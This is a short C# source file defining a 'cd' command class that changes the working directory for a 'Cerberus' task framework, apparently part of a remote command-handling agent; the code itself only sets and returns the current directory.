using Cerberus.Models.Tasks;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Cerberus.Commands
{
    public class ChangeDirectory : CerberusCommand
    {
        public override string Name => "cd";

        public override string Execute(CerberusTask task)
        {
            string path;

            if (task.Arguments is null || task.Arguments.Length == 0)
            {
                path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            }
            else
            {
                path = task.Arguments[0];
            }

            try
            {
                Directory.SetCurrentDirectory(path);
            }
            catch(Exception ex)
            {
                return ex.Message;
            }

            return Directory.GetCurrentDirectory();
        }
    }
}
